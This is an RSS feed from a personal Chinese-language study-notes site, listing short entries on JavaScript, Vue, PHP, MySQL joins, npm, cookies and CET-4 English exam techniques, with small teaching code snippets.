<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Rainy · Note</title>
    <link>https://note.yxzi.xyz/</link>
    <description>Recent content on Rainy · Note</description>
    <image>
      <url>https://note.yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://note.yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 06 Jun 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://note.yxzi.xyz/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux 命令</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/linux-%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/linux-%E5%91%BD%E4%BB%A4/</guid>
      <description>Linux 命令 sudo sudo -s 切换到 root 用户，获取管理员权限</description>
    </item>
    
    <item>
      <title>Server 2012 FTP</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/server-2012-ftp/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/server-2012-ftp/</guid>
      <description>Server 2012 FTP 安装 FTP 新建用户 新建站点  </description>
    </item>
    
    <item>
      <title>English Listening</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/listening/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/listening/</guid>
      <description>Listening 顺序原则 **题目的顺序和对话的先后顺序是绝对一致的，**绝对是第一题的关键句子出现之后，第二题的才可能出来。所以你做题的时候要是听到了第二题的答案但是第一题还没选，那赶紧瞎蒙一个，根本不影响后面的做题。
视听一致 权威统计，四级的听力有 90%的答案都是原文
耳朵听到的信息与眼睛所看到的信息越一致，则越容易称为正确答案。
 关键词与音频内容完全相符的选项。 关键词在音频中出现的次数最多的选项。  选取关键词 纵向：排除相同概念。
横向：划实不划虚，划组合概念。
  听音频的同时，眼睛来回扫视画出来的关键词。
  听见与选项对应的关键词，听到几次则标记几次。
  同转 关键词与音频内容不完全符合，但都表达用一个意思。
 同根词 词词替换 短语概念替换 泛指到特指  错误选项的特点  直接被否定。 反义表述。 选项部分信息音频中并未提及。  短篇新闻  划关键字并猜测发音。 使用视听一致 +同转的原则。 如果依旧没听出来，可以用错误选项的特点，反向选出答案。  长对话  注意换题信号以及语气的按时作用。  考前磨耳朵 考试前自己先听一两套真题。
平时如何练习 倍速听 1.2 或 1.5 倍速听，</description>
    </item>
    
    <item>
      <title>English Reading</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/reading/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/reading/</guid>
      <description>Reading 做题顺序：
Section C 仔细阅读
Section B 长阅读
Section A 选词填空
Section C 问题的顺序和文章的顺序一致，第一道题的答案在原文中的位置，一定在第二道题的前面。
keyword 读题目的时候，圈出题目中的关键词，比如时间、地点、名字、特定名称、数字数据。
建议先圈出 2~3 到题目的关键词，然后直接去读文章，等到这个 2~3 题找到答案后，再继续读剩下的题目，继续圈关键词。
Locate 根据关键字，在原文中锁定答案范围。
Analyze 分析选项和原文的匹配程度！
难一点的题目，会存在同义替换的现象，题目中和原文中的关键词并不是同一个单词，但是意思却一致。
SectionB 用 KLA 法则，但是要注意：
 题目的多个关键词在原文中都可以匹配上，或者有同义替换，这就可以确定为正确答案。  SectionA 瞎蒙就对了。
平时如何练习 第 1 遍
先计时做，模拟实战。不要看答案，把答案写在纸上。
第 2 遍
第 1 遍做完后，对照真题解析把文章中的生词查出来，包括选项题干里面的单词，把意思写在真题旁边。查完做第 2 遍，不用限时，做完后把答案写在纸上，还是不看答案。
第 3 遍
对照解析逐句翻译！！就是 1 句 1 句的翻译，不会翻译就看解析里的句子分析，把每个句子翻译通，弄懂在讲什么意思。
最后再模拟实战，做最后一遍，把答案写在纸上。
最后对答案，看看 3 遍下来，选的答案变动大不大？正确率提高了多少？如果 3 遍之后还有做错的题，重点分析错题，包括题干、选项还有对应的答案句，弄清楚是为什么错。</description>
    </item>
    
    <item>
      <title>JavaScrip class</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/class/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/class/</guid>
      <description>class 创建一个基于原型继承类。
class Phone { 	// 调用构造方法 	constructor(height, width) { 	this.area = height * width; 	}  	fun() { 	console.log(&amp;#39;i am function&amp;#39;); 	} }  let apple = new Phone(4, 3); apple.fun(); </description>
    </item>
    
    <item>
      <title>JavaScrip constructor</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/constructor/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/constructor/</guid>
      <description>constructor() 用于创建和初始化class创建的对象的特殊方法。</description>
    </item>
    
    <item>
      <title>JavaScrip Object 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/object/object-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/object/object-%E5%B1%9E%E6%80%A7/</guid>
      <description>Object 属性 constructor 返回构造当前对象的构造函数。
var array = [];  // return ƒ Array() { [native code] } console.log(array.constructor); </description>
    </item>
    
    <item>
      <title>JavaScrip static</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/static/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/static/</guid>
      <description>static 定义静态方法。静态方法不能在类的实例上调用静态方法，而应该通过类本身调用。
class Phone { 	static name = &amp;#39;静态方法&amp;#39;; }  let apple = new Phone(4, 3); console.log(apple.name); console.log(Phone.name); </description>
    </item>
    
    <item>
      <title>Map</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/map/map/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/map/map/</guid>
      <description>Map 用于保存键值对，并且能够记住键的原始插入顺序。任何值都可以作为一个键或一个值。
const map1 = new Map();  map1.set(&amp;#39;a&amp;#39;, 1); map1.set(&amp;#39;b&amp;#39;, 2); map1.set(&amp;#39;c&amp;#39;, 3);  console.log(map1.get(&amp;#39;a&amp;#39;)); // return 1  map1.set(&amp;#39;a&amp;#39;, 97);  console.log(map1.get(&amp;#39;a&amp;#39;)); // return 97  console.log(map1.size); // return 3  map1.delete(&amp;#39;b&amp;#39;);  console.log(map1.size); // return 2 </description>
    </item>
    
    <item>
      <title>Map 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/map/map-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/map/map-%E6%96%B9%E6%B3%95/</guid>
      <description>Map 方法 set() 添加或更新指定的键值。
delete() 移除指定元素
get() 返回一个指定元素。
clear() 清空所有元素</description>
    </item>
    
    <item>
      <title>Promise 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise-%E6%96%B9%E6%B3%95/</guid>
      <description>Promise 方法 than() then() 返回一个 Promise 对象。它有两个参数：Promise 调用resolve() 和调用 rejecte() 情况的回调函数。
返回 Promise 对象 than()的返回值如果是 Promise 对象，那么该 Promise 对象的执行结果会作为当前 than() 的返回值。
let p = new Promise((resolve, reject) =&amp;gt; { 	setTimeout(() =&amp;gt; { 	resolve(&amp;#39;success&amp;#39;); 	}, 1000); });  let result = p.then( 	(value) =&amp;gt; { 	console.log(value); 	return new Promise((resolve, reject) =&amp;gt; { 	reject(&amp;#39;fail&amp;#39;); 	}); 	}, 	(reason) =&amp;gt; { 	console.error(reason); 	} );  // rejected // &amp;#34;fail&amp;#34; console.</description>
    </item>
    
    <item>
      <title>Set</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/set/set/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/set/set/</guid>
      <description>Set 用于存储任何类型的唯一值。
数组去重 const arr = [2, 3, 4, 4, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 5, 32, 3, 4, 5]; console.log([...new Set(arr)]); 交集 并集 let arr = [1, 4, 3, 8]; let arr2 = [5, 1, 7, 2];  let union = [...new Set([...arr, ...arr2])]; console.log(union); 差集 </description>
    </item>
    
    <item>
      <title>Set 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/set/set-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/set/set-%E6%96%B9%E6%B3%95/</guid>
      <description>Set 方法 add() 向末尾添加一个指定的元素。
delete() 删除指定元素。
has() 检测 set 中是否存在指定元素。
clear() 清空所有元素。</description>
    </item>
    
    <item>
      <title>Vue 插件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E4%BB%B6/</link>
      <pubDate>Sat, 04 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E4%BB%B6/</guid>
      <description>插件 用于增强 Vue，本质是一个包含install()的一个对象。
install()的第一个参数是 Vue 构造 ，第二个参数是一个可选的选项对象：
使用
新建 plugins.js，定义一个包含install()的对象，并暴露。
export default { 	install(Vue, x) { 	console.log(Vue, x); 	}, }; 在 main.js 中导入并使用 plugins。
import plugins from &amp;#39;./plugins&amp;#39;; Vue.use(plugins, 6666); </description>
    </item>
    
    <item>
      <title>Vue 混入</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%B7%B7%E5%85%A5/</link>
      <pubDate>Sat, 04 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%B7%B7%E5%85%A5/</guid>
      <description>混入 将多个组件共用的配置提取成一个 mixin 对象。
组件自身的配置和mixin的配置相同时，则优先使用组件自身的配置。钩子函数例外，不管是组件自身的钩子函数还是 mixin的钩子函数，这些钩子函数都会被调用，且 mixin 中的钩子函数先调用，组件自身的钩子函数后调用。
mixins 局部混入，对指定的组件，应用mixin
使用
新建mixin.js，在其中配置 mixin 对象，并暴露mixin 对象。
let mixin = { 	methods: { 	fun() { 	console.log(‘mixin’); 	}, 	}, };  export default mixin; 对每个需要使用 mixin 的组件配置mixins
export default { 	name: &amp;#39;Student&amp;#39;, 	data() { 	return { 	tips: &amp;#39;Hi&amp;#39;, 	myAge: this.age, 	}; 	}, 	// 使用 mixin 	mixins: [mixin], }; mixin 全局混入，对每个组件实例（包括 Vue 实例）都应用指定的mixin。</description>
    </item>
    
    <item>
      <title>Promise</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise/</link>
      <pubDate>Fri, 03 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise/</guid>
      <description>Promise Promise 说得通俗一点就是一种写代码的方式，并且是用来写 JavaScript 编程中的异步代码。
可以封装 ajax.
基本使用 let p = new Promise((resolve, reject) =&amp;gt; { 	if (0) { 	// 成功 	resolve(&amp;#39;success&amp;#39;); 	} else { 	// 失败 	reject(&amp;#39;fail&amp;#39;); 	} });  p.then( 	// 如果 p 调用了 resolve() 	(value) =&amp;gt; { 	console.log(value); 	}, 	// 如果 p 调用了 reject() 	(reason) =&amp;gt; { 	console.error(reason); 	} ); 读取文件 let fs = require(&amp;#39;fs&amp;#39;); let p = new Promise((resolve, reject) =&amp;gt; { 	fs.</description>
    </item>
    
    <item>
      <title>English 被动语态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/</link>
      <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/</guid>
      <description>被动语态 语态是谓语动词的一种形式。
谓语动词是主动语态的句子是主动句，谓语动词是被动语态的句子是被动句。
主动语态和被动语态 主动语态：主语是动作的执行者。
 I help him.  被动语态：主语是动作的承受者。
由助动词 be + 及物动词的过去分词构成。
 He is helped by me.  被动语态就是将主动语态中的宾语（him）拿来作主语（He），而且一般的被动句子中没有宾语，除非用双宾动词构成主语。
一般现在时态 主语 + 助动词 + 及物动词的过去分词 +状语。
 I am believed by my friends. Expensive shoes are bought by rich people. He is cheated.  一般过去时态 主语 + 助动词 be 的过去式 + 及物动词的过去分词 + 状语。
 The house was built in 2001。 Her birthday party was held last week.</description>
    </item>
    
    <item>
      <title>npm view</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-view/</link>
      <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-view/</guid>
      <description>npm view 显示有关模块的数据。</description>
    </item>
    
    <item>
      <title>cookie</title>
      <link>https://note.yxzi.xyz/note/technology/internet/http/cookie/</link>
      <pubDate>Mon, 30 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/http/cookie/</guid>
      <description>cookie cookie 是网站的服务器发送到用户浏览器并保存在本地的一个小文件，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。
cookie 保存了你登录网站时的用户名、密码，有了它，只需要在下次请求服务器时带着 cookie 发送，服务器就不会再让你重新输入用户名、密码登录。
cookie 是设计用来在服务端和客户端进行信息传递的。
无法跨浏览器读取 我们使用 chrome 浏览器去访问 github 时，那么 chrome 浏览器会得到一个 cookie，当你下次访问 github 时，就无需再重新输入用户名和密码。但如果你换 Firefox 浏览器去访问 github，那么你依旧需要重新输入用户名和密码，这是因为 cookie 无法跨浏览器读取。即对于相同的网站，每个浏览器都有属于它自己的 cookie。
作用  会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等）  </description>
    </item>
    
    <item>
      <title>JavaScrip Symbol</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/symbol/</link>
      <pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/symbol/</guid>
      <description>Symbol 一般用于给对象添加一个独一无二的属性或方法。
使用Symbol()定义一个Symbol类型的数据。
// 添加方式一 var game = { 	house() {}, }; let methods = { 	fun: Symbol(), };  // 给对象中的属性添加方法 game[methods.fun] = function () { 	console.log(&amp;#39;方法1&amp;#39;); }; // 添加方式二 var game = { 	[Symbol(&amp;#39;fun&amp;#39;)]: function () { 	console.log(&amp;#39;methods one &amp;#39;); 	}, }; console.log(game);  Symbol 是原始类型，不是引用类型，不能使用 new。
Symbol()可以接受一个字符串作为参数，表示对 Symbol 实例的描述，主要是为了在控制台显示，或者转为字符串时，比较容易区分。
Symbol 类型的值时唯一的，用来解决命名冲突的问题。
Symbol 类型的值不能于其他数据进行运算
Symbol 定义的对象属性不能被遍历</description>
    </item>
    
    <item>
      <title>English CET 4</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/cet-4/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/cet-4/</guid>
      <description>CET 4 ![CET 4](CET 4.assets/CET 4.png)
分值性价比 写作性价比 = 710 * 15 % / 30 = 3.55
听力性价比 = 710 * 35 % / 25 = 9.94
阅读性价比 = 710 * 35 % / 40 = 6.21
翻译性价比 = 710 * 15 % / 30 = 3.55
由此可得：
题目的性价比：听力 &amp;gt; 阅读 &amp;gt; 作文 &amp;gt; 翻译
提分简易程度：听力 &amp;gt; 阅读 &amp;gt; 作文 &amp;gt; 翻译
考场必备  准考证、身份证、学生证（缺一不可）。 2B 铅笔、橡皮、0.5mm 黑色中性笔。 考试专用耳机  </description>
    </item>
    
    <item>
      <title>English there be</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/there-be/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/there-be/</guid>
      <description>there be 某个地方（时候）存在某个东西。
就近原则 there be 句型中的 be，用哪个格式取决于离 be 最近的主语。
 There is a book,a norebook and two dictionaries on the desk. There are two dictionaries, a book ,a notebook on the desk.  there be 和 have 的区别：
 have：谁拥有某个东西。  there be 否定句  There is no people in the room.  there be 疑问句  Are there ten people in the bedroom.  </description>
    </item>
    
    <item>
      <title>English Translation</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/translation/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/translation/</guid>
      <description>Translation 选择写基础简单句，越简单越好。
勉强表达原文意思，可以意译，千万别留空。</description>
    </item>
    
    <item>
      <title>English Writing</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/writing/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/writing/</guid>
      <description>Writing 背万能句 首段
Recently, the rise in the problem of __ has aroused wide concern.
近来， **__**问题的增加已经引起了广泛的关注。
Now there is a growing awareness of the necessity to _
如今，人们越来越意识到 **__**的必要性。
Different people hold different views about**__** .
对于**__**，不同的人有不同的看法。
i think ，**_**have become an essential part of people is life
我认为， **_**已经成为人们生活中必不可少的一部分
中段
Talking about __, the first thing that may occur to you and me seems to be __.
说到**__，我们首先想到的似乎就是_**</description>
    </item>
    
    <item>
      <title>HTML 理想视口</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E7%90%86%E6%83%B3%E8%A7%86%E5%8F%A3/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E7%90%86%E6%83%B3%E8%A7%86%E5%8F%A3/</guid>
      <description>理想视口 开启移动端的理想视口。
&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width,initial-scale=1.0&amp;#34; /&amp;gt; </description>
    </item>
    
    <item>
      <title>npm package-lock.json</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/package-lock.json/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/package-lock.json/</guid>
      <description>package-lock.json 是在 npm install时候生成一份文件。记录了 node_modules 目录下所有模块（包）的名称、版本号、下载地址、及这个模块又依赖了哪些依赖。
作用 如果重新 npm install 的时候以及当 node_modules 文件夹并不存在或被删除时，需要用到 npm install 重新装载全部依赖时，通过 package-lock.json 可以直接表明下载地址和相关依赖，就无需再从 package.json 逐个分析包的依赖项，因此会大大加快安装速度，package-lock.json 目的就是确保所有库包与你上次安装的完全一样。</description>
    </item>
    
    <item>
      <title>PHP 指针函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%8C%87%E9%92%88%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 26 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%8C%87%E9%92%88%E5%87%BD%E6%95%B0/</guid>
      <description>指针函数 next()和prex()会移动指针，有可能导致指针移出数组，导致
数组不能使用，此时，无法通过next() 和prex()使指针回到数组，只能通过end()或reset()重置指针。</description>
    </item>
    
    <item>
      <title>PHP closure</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/closure/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/closure/</guid>
      <description>closure php 的 Closure，v 也就是匿名函数。
匿名函数中，默认无法访问外部函数中的变量。
function demo() {  $a = 1;  function fun()  {  // 无法使用 demo() 中的 $a  echo $a;  };  fun(); }; demo(); 通过 use()将外部变量传入到内部函数的作用域内：
function demo() {  $a = 1;  $fun = function () use ($a) {   echo $a;  };  $fun(); };  demo(); 闭包 匿名函数中的use()，其作用就是从父作用域继承变量，继承之后，就会形成一个闭包。
function demo() {  $a = 1;  $fun = function () use ($a) {   echo $a;  };  return $fun; };  $closure = demo();  $closure(); </description>
    </item>
    
    <item>
      <title>PHP echo() 、print()、var_dump()的区别</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/echo-printvar_dump%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/echo-printvar_dump%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>echo() 、print()、var_dump()的区别 echo() 输出一个或多个字符串。
echo() 实际不是一个函数（而是语言结构），因此可以不使用()。
print() 输出一个或多个字符串。
print() 实际不是一个函数（而是语言结构），因此可以不使用()。
var_dump() 返回变量的类型与值。
区别  echo()能接受多个字符串类型的参数，能同时输出多个字符串。当echo()接受多个参数时，不能使用括号。 print()只能接收 1 个字符串类型的参数；只能同时输出一个字符串； print()打印的值能直接赋值给一个变量：`$a = print “123” echo()输出的速度比 print() 快。 echo()没有返回值，而print()有返回值，其返回值永远为int类型的 1。  </description>
    </item>
    
    <item>
      <title>PHP static</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/static/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/static/</guid>
      <description>static 静态全局变量与普通全局变量的区别 非静态全局变量的作用域是整个源程序， 当一个源程序由多个源文件组成时，非静态全局变量在各个源文件中都是有效的。
静态全局变量的作用域只在当前源文件内， 在同一源程序的其它源文件中不能使用它，因此可以避免变量污染。
静态局部变量与普通局部变量 静态局部变量只被初始化一次，变量下一次的值依据的是上次的结果值。
静态函数与普通函数 静态函数在内存中只有一份，普通函数在每个被调用中维持一份拷贝。
作用 拥挤函数的执行次数。
统计函数多次调用的不同结果。</description>
    </item>
    
    <item>
      <title>PHP 伪类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E4%BC%AA%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E4%BC%AA%E7%B1%BB%E5%9E%8B/</guid>
      <description>伪类型 用于在 PHP 文档里指示参数可以使用的类型和值，但实际上伪类型在 PHP 中不存在。
mixed mixed 说明一个参数可以接受多种不同的(但不一定是所有的)类型。
例如：gettype()可以接受所有的 PHP 类型，str_replace()可以接受字符串和数组，
number number 说明一个参数可以是 integer 或者 float。
callback 本文档中在 PHP5.4 引入 callable 类型之前使用了 callback 伪类型，二者涵义完全相同，
array|object array|object 意思是参数既可以是 array 也可以是 object，
void void 作为返回类型意味着函数的返回值是无用的，
void 作为参数列表意味着函数不接受任何参数，</description>
    </item>
    
    <item>
      <title>PHP 变量</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%8F%98%E9%87%8F/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%8F%98%E9%87%8F/</guid>
      <description>变量 预定义变量 指的是系统提前定义的变量，存储许多需要用到的数据，并且，预定义变量都 是数组。
$_GET：获取所有表单以 get 方式提交的数据。
$_POST：获取所有表单以 post 方式提交的 value。
$_REQUEST：GET 和 POST 提交的都会保存。
$_GLOBALS：PHP 中所有的全局变量。
$_SERVER：服务器信息。
$_SESSION：获取 session 会话数据。
$_COOKIE：获取 cookie 的会话数据。
$_ENV：环境信息。
$_FILES：用户上传的文件信息。
可变变量 可变变量就是变量的变量。
$a = &amp;#39;b&amp;#39;; $b = &amp;#39;bb&amp;#39;; // $$a = $ + $a = $ + b = $b = bb echo $$a;  </description>
    </item>
    
    <item>
      <title>MySQL 外连接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%A4%96%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%A4%96%E8%BF%9E%E6%8E%A5/</guid>
      <description>外连接 查询主表中的所有记录，如果从表中有与其匹配的记录，则显示该记录的值；如果从表中没有与其匹配的记录，则显示 Null。
左外链接 LEFT JOIN 的左侧是主表。
查询男朋友不在男神表的女神名 SELECT b.name AS Name FROM beauty AS b LEFT OUTER JOIN boys boy ON b.boyfriend_id = boy.id WHERE boy.boyName IS NULL 查询哪些部门没有员工 SELECT department_name FROM departments AS d LEFT OUTER JOIN employees e ON d.department_id = e.department_id WHERE e.department_id IS NULL 右外链接 RIGHT JOIN 的右侧是主表。
查询男朋友不在男神表的女神名 SELECT b.name AS Name FROM boys boy RIGHT OUTER JOIN beauty AS b ON b.boyfriend_id = boy.</description>
    </item>
    
    <item>
      <title>MySQL 等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
      <description>等值链接 判断不同表中都包含的字段是否相等，相等则显示，不等则过滤。且一般都用=来判断。
一般需要为表起别名。
查询员工名、部门名、工种名、并按部门名降序（三表链接） SELECT last_name, department_name,job_title FROM employees e INNER JOIN departments d ON e.department_id = d.department_id INNER JOIN jobs j ON e.job_id = j.job_id ORDER BY department_name DESC; </description>
    </item>
    
    <item>
      <title>MySQL 自链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E8%87%AA%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E8%87%AA%E8%BF%9E%E6%8E%A5/</guid>
      <description>自链接 判断同一张表中的不同字段是否相等，相等则显示，不相等则过滤。需要给同一张表取不同的别名，让系统分清同一张表中的不同字段。
查询员工名所对应的领导名 SELECT e.last_name AS employeeName,m.last_name AS managerName FROM employees AS e INNER JOIN employees AS m ON e.manager_id = m.employee_id </description>
    </item>
    
    <item>
      <title>MySQL 非等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
